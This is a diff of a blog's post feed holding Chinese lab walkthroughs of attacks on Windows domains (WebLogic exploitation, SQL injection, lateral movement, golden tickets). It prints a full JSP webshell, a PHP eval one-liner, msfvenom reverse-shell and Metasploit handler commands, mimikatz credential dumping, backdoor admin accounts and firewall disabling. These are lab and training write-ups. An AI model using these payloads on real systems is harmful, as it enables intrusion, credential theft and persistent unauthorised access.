+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
+<p><code>sudo nmap 192.168.0.80 -sV</code></p>
+<blockquote>
+<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
+</blockquote>
+<p><img src="/posts/8a9ea0cb/nmap.png"></p>
+<p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
+<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
+<p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
+<p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<p>抓包测试</p>
+<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
+<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
+<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
+<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
+<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
+<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
+<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
+<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
+<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
+<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
+<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
+<p>1.把shell写到控制台images目录中</p>
+<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
+<p>2.写到uddiexplorer目录中</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
+<p>3.写到应用安装目录中</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
+<p>上传蚁剑的jsp马。密码为ant</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
+<p>使用蚁剑进行连接</p>
+<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
+<p>然后可以使用<code>As-Exploits</code>插件</p>
+<p>发现该机器上有安装360</p>
+<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
+<p><img src="/posts/8a9ea0cb/cs1.png"></p>
+<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户sid  shell whoami &#x2F;user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user &#x2F;domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view &#x2F;domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>shell whoami /user</code></p>
+<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
+<p><code>shell systeminfo</code></p>
+<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
+<p><code>shell net config workstation</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
+<p><code>shell net user /domain</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
+<p><code>net computers</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
+<p>使用CS的portscan模块扫描域内主机端口</p>
+<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
+<p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
+<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
+<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
+<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
+<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
+<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
+<p>使用CS的<code>run_mimikatz</code>模块</p>
+<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
+<p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
+<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
+<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
+<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
+<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
+<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
+<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
+<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
+<p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
+<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
+<p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
+<p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
+<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
+<p>成功拿到域控DC.</p>
+<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
+<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
+<p>在msf中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
+<p>msf添加路由</p>
+<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
+<p><img src="/posts/8a9ea0cb/route_print.png"></p>
+<p>配置代理，在proxychains4设置127.0.0.1 1080</p>
+<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
+<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
+<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
+<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
+<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
+<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
+<p>利用需要的条件:</p>
+<p>1.域名称</p>
+<p>2.域的SID值</p>
+<p>3.域的KRBTGT账户NTLM密码哈希</p>
+<p>4.伪造用户名</p>
+<p>使用CS清除client端(域内其他机器)的票据</p>
+<p><code>kerberos_ticket_purge</code></p>
+<p><code>shell klist</code>查看票据信息是否已经被清除</p>
+<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
+<p>使用CS生成黄金票据</p>
+<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
+<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
+]]></content>
+      <categories>
+        <category>vulnstack</category>
+      </categories>
+      <tags>
+        <tag>vulnstack</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>xss-labs2</title>
     <url>/posts/b04952e9/</url>
     <content><![CDATA[<p>14</p>
@@ -3285,77 +3411,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>zkaq内网靶场1</title>
-    <url>/posts/3796bdc4/</url>
-    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>输入 <code>?id=1&#39;</code> 网站报错 爆出网站的绝对路径</p>
-<p><img src="/posts/3796bdc4/dir.png"></p>
-<p>?id=1 order by 2 发现存在两个字段</p>
-<p>使用union select没有回显，使用 into outfile 进行文件写入</p>
-<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
-<p>访问  m.txt 成功写入</p>
-<p><img src="/posts/3796bdc4/m.png"></p>
-<p>尝试写入一句话到网站根目录中</p>
-<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
-<p>访问mm.php发现成功写入，使用蚁剑进行连接</p>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
-<p><code>ipconfig </code>发现内网ip 为 10.0.1.4</p>
-<p><code>netstat -ano</code> 查看开放的端口</p>
-<p><code>tasklist</code> 查看运行的进程</p>
-<p><code>systeminfo</code>  查看系统信息 补丁号 </p>
-<p><img src="/posts/3796bdc4/buding.png"></p>
-<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
-<p>去这个网站找一下可以利用的exp</p>
-<br>
-
-<h4 id="JuicyPotato提权"><a href="#JuicyPotato提权" class="headerlink" title="JuicyPotato提权"></a>JuicyPotato提权</h4><p>HotPotato提权</p>
-<p>上传 JuicyPotato.exe </p>
-<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
-<p><img src="/posts/3796bdc4/potato.png"></p>
-<p>提权为system权限，然后再添加用户</p>
-<p><code>net user Mamor A1S2D3! /add</code> </p>
-<p> bbb.exe -p “net localgroup administrators Mamor /add”  //将用户添加到管理员组权限</p>
-<p><img src="/posts/3796bdc4/netuser1.png"></p>
-<p>net user 查看是否创建成功</p>
-<p><img src="/posts/3796bdc4/netuser2.png"></p>
-<p>成功创建用户</p>
-<br>
-
-<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>内网穿透两种方法:<br>1.让目标机器去连接外网主机(需要公网ip)  前提是目标可以访问外网<br>2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
-<p>使用reGeorg进行内网穿透 </p>
-<p>将 reGeorg中的 tunnel.nosocket.php 传到目标机器 改名为reG.php</p>
-<p>再公网访问下 </p>
-<p><img src="/posts/3796bdc4/reG1.png"></p>
-<p>本机执行 (python2)</p>
-<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
-<p><img src="/posts/3796bdc4/reGrun.png"></p>
-<p>本机使用Proxifier 设置代理服务器 127.0.0.1 9999 socks5</p>
-<p><img src="/posts/3796bdc4/Proxy.png"></p>
-<p>设置代理规则 </p>
-<p><img src="/posts/3796bdc4/Proxy2.png"></p>
-<p>设置完代理后 使用 mstsc 远程连接10.0.1.4 成功登录</p>
-<br>
-
-<h4 id="使用-mimikatz-读取密码"><a href="#使用-mimikatz-读取密码" class="headerlink" title="使用 mimikatz 读取密码"></a>使用 mimikatz 读取密码</h4><p>将 mimikatz通过蚁剑上传到服务器 以管理员身份运行（windows2012/2016不能抓）</p>
-<p>提权<code> privilege::debug</code></p>
-<p><img src="/posts/3796bdc4/mm2.png"></p>
-<p>抓取密码 <code>sekurlsa::logonpasswords</code></p>
-<p>成功抓取到Administrator密码 woshifengge1.</p>
-<p><img src="/posts/3796bdc4/mm3.png"></p>
-<br>
-
-<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>探测内网中是否还有其它主机</p>
-<p>mstsc 尝试连接10.0.1.8 使用admin 密码成功登录</p>
-<p>得到flag</p>
-<p><img src="/posts/3796bdc4/flag.png"></p>
-]]></content>
-      <categories>
-        <category>zkaq</category>
-      </categories>
-      <tags>
-        <tag>zkaq</tag>
       </tags>
   </entry>
   <entry>
@@ -3436,134 +3491,86 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>常用Windows远程连接和相关命令</title>
-    <url>/posts/9527b68a/</url>
-    <content><![CDATA[<h3 id="IPC-共享连接"><a href="#IPC-共享连接" class="headerlink" title="IPC$共享连接"></a>IPC$共享连接</h3><p>IPC$ （Internet Process Connection) 共享”命名管道”的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
-<br>
-
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
-<li>目标主机开启139，445端口</li>
-<li>目标主机管理员开启<code>IPC$</code>默认共享服务</li>
-<li>知道目标主机的账号密码</li>
-</ul>
-<br>
-
-<h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="查看Windows默认开启的共享"><a href="#查看Windows默认开启的共享" class="headerlink" title="查看Windows默认开启的共享"></a>查看Windows默认开启的共享</h5><p><code>net share</code> </p>
-<h5 id="查看当前主机所建立的连接"><a href="#查看当前主机所建立的连接" class="headerlink" title="查看当前主机所建立的连接"></a>查看当前主机所建立的连接</h5><p><code>net use</code></p>
-<h4 id="确定主机时间"><a href="#确定主机时间" class="headerlink" title="确定主机时间"></a>确定主机时间</h4><p><code>net time \\ip </code></p>
-<h4 id="开启-关闭IPC-共享"><a href="#开启-关闭IPC-共享" class="headerlink" title="开启/关闭IPC$共享"></a>开启/关闭IPC$共享</h4><p><code>net share ipc$</code> </p>
-<p><code>net share ipc$ /del</code></p>
-<h5 id="建立空连接"><a href="#建立空连接" class="headerlink" title="建立空连接"></a>建立空连接</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
-<h5 id="建立完整的用户名-密码IPC-连接"><a href="#建立完整的用户名-密码IPC-连接" class="headerlink" title="建立完整的用户名 密码IPC$连接"></a>建立完整的用户名 密码IPC$连接</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
-<h5 id="删除IPC-连接"><a href="#删除IPC-连接" class="headerlink" title="删除IPC$连接"></a>删除IPC$连接</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
-<h5 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> 把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
-<p><code>net use z: \\10.10.0.164\c$</code>（已经建立ipc连接的情况下）</p>
-<p><img src="/posts/9527b68a/yingshe.png"></p>
-<h5 id="删除映射的z盘"><a href="#删除映射的z盘" class="headerlink" title="删除映射的z盘"></a>删除映射的z盘</h5><p><code>net use z: /del </code></p>
-<h5 id="删除全部"><a href="#删除全部" class="headerlink" title="删除全部"></a>删除全部</h5><p><code>net use * /del</code></p>
-<h5 id="使用dir查看目标机器目录"><a href="#使用dir查看目标机器目录" class="headerlink" title="使用dir查看目标机器目录"></a>使用dir查看目标机器目录</h5><p><code>dir \\10.10.0.164\c$</code></p>
-<p><img src="/posts/9527b68a/dir.png"></p>
-<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><p><code>copy test.txt \\10.10.0.164\c$</code> 将test.txt复制到目标主机的c盘</p>
-<h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
-<h4 id="使用at命令创建计划任务"><a href="#使用at命令创建计划任务" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h4><p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
-<p><code>at \\10.10.0.164  </code></p>
-<p>删除id为1的计划任务</p>
-<p><code>at \\10.10.0.164 1 /delete</code></p>
-<h4 id="使用type读取文件"><a href="#使用type读取文件" class="headerlink" title="使用type读取文件"></a>使用type读取文件</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  读取目标机器的1.txt文件</p>
-<br>
-
-<br>
-
-<h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>win7  攻击机  </p>
-<p>win2012 目标机   10.10.0.164</p>
-<br>
-
-<p>使用win7与目标机建立ipc连接</p>
-<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
-<p>查看目标机器的时间</p>
-<p><code>net time \\10.10.0.164 </code></p>
-<p>使用dir读取目标机器c盘的文件</p>
-<p><code>dir \\10.10.0.164\c$ </code></p>
-<p>使用type读取目标主机c盘下的1.txt</p>
-<p><code>type \\10.10.0.164\c$\1.txt</code></p>
-<p>选择将目标主机的c盘映射到本地z盘</p>
-<p><code>net use z: \\10.10.0.164\c$ </code></p>
-<p>在建立ipc连接后利用Psexec反弹cmd</p>
-<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
-<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
-<p>删除映射的z盘</p>
-<p><code>net use z: /del </code></p>
-<p>删除ipc$连接</p>
-<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
-<p>删除全部</p>
-<p><code>net use * /del </code></p>
-<br>
-
-<h3 id="IPC-计划任务进行横向渗透"><a href="#IPC-计划任务进行横向渗透" class="headerlink" title="IPC+计划任务进行横向渗透"></a>IPC+计划任务进行横向渗透</h3><h4 id="使用schtasks命令"><a href="#使用schtasks命令" class="headerlink" title="使用schtasks命令"></a>使用schtasks命令</h4><p>利用流程</p>
-<ol>
-<li>与目标建立IPC连接</li>
-<li>使用copy命令将木马、命令脚本复制到目标机器</li>
-<li>目标机器创建计划任务，使其自动触发木马、脚本</li>
-<li>删除IPC连接</li>
-</ol>
-<p>环境</p>
-<pre><code>攻击机  192.168.0.128 (kali)
-
-目标机  192.168.0.164 (Win2012）
-
-跳板机  192.168.0.157 (WIn2008)
-</code></pre>
-<br>
-
-<h5 id="跳板机与目标机建立IPC连接"><a href="#跳板机与目标机建立IPC连接" class="headerlink" title="跳板机与目标机建立IPC连接"></a>跳板机与目标机建立IPC连接</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
-<h5 id="kali上生成木马"><a href="#kali上生成木马" class="headerlink" title="kali上生成木马"></a>kali上生成木马</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
-<h4 id="将shell-exe传到跳转机上"><a href="#将shell-exe传到跳转机上" class="headerlink" title="将shell.exe传到跳转机上"></a>将shell.exe传到跳转机上</h4><p>在kali上开启一个http服务</p>
-<p><code>python3 -m http.server 9999</code></p>
-<p>在跳转机上访问并下载shell.exe</p>
-<h5 id="在跳转机上使用copy命令将shell-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell.exe复制到目标机"></a>在跳转机上使用copy命令将shell.exe复制到目标机</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
-<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
-<h5 id="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe"><a href="#利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe" class="headerlink" title="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe"></a>利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
-<p><img src="/posts/9527b68a/schtasks1.png"></p>
-<p>使用nc监听win2008跳转机的8888端口</p>
-<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
-<h5 id="利用schtasks-执行命令，使用type读取文件内容"><a href="#利用schtasks-执行命令，使用type读取文件内容" class="headerlink" title="利用schtasks 执行命令，使用type读取文件内容"></a>利用schtasks 执行命令，使用type读取文件内容</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
-<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
-<p>查看是否生成result.txt</p>
-<p><code>dir \\192.168.0.164\c$</code></p>
-<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
-<p>查看result.txt的内容</p>
-<p><code>type \\192.168.0.164\c$\result.txt</code></p>
-<p><img src="/posts/9527b68a/result.png"></p>
-<h5 id="schtasks-删除计划任务"><a href="#schtasks-删除计划任务" class="headerlink" title="schtasks 删除计划任务"></a>schtasks 删除计划任务</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
-<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
-<h5 id="断开ipc-连接"><a href="#断开ipc-连接" class="headerlink" title="断开ipc$连接"></a>断开ipc$连接</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
-<h5 id="schtasks-参数"><a href="#schtasks-参数" class="headerlink" title="schtasks 参数"></a>schtasks 参数</h5><blockquote>
-<p>S [目标主机]<br>/U [目标用户名]<br>/P [目标密码]<br>/TN [任务名称]<br>/TR [执行程序]<br>/SC [执行方式，once为执行1次]<br>/ST [定时计划执行时间]<br>/f  [默认为Y，不进行回显交互，直接运行]<br>/i  [显示程序窗口交互]</p>
-</blockquote>
-<h4 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h4><p>at命令和schtasks命令类似</p>
-<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令<br>所以在这里使用win7 代替之前使用的win2012<br>环境<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
-<h5 id="与建立目标机器建立IPC连接"><a href="#与建立目标机器建立IPC连接" class="headerlink" title="与建立目标机器建立IPC连接"></a>与建立目标机器建立IPC连接</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
-<h5 id="在跳转机上使用copy命令将shell2-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell2-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell2.exe复制到目标机"></a>在跳转机上使用copy命令将shell2.exe复制到目标机</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
-<h5 id="使用at命令创建计划任务-1"><a href="#使用at命令创建计划任务-1" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h5><p>查看目标机器时间</p>
-<p><code>net time \\192.168.0.157 </code> 这里的时间可能与本地不符合</p>
-<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
-<p><img src="/posts/9527b68a/at_shell2.png"></p>
-<h5 id="查看任务列表"><a href="#查看任务列表" class="headerlink" title="查看任务列表"></a>查看任务列表</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
-<br>
-
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
-<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
-<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
-</blockquote>
+    <title>使用proxychains4gitclone拒绝访问</title>
+    <url>/posts/3a6e39d4/</url>
+    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
 ]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>zkaq内网靶场1</title>
+    <url>/posts/3796bdc4/</url>
+    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>输入 <code>?id=1&#39;</code> 网站报错 爆出网站的绝对路径</p>
+<p><img src="/posts/3796bdc4/dir.png"></p>
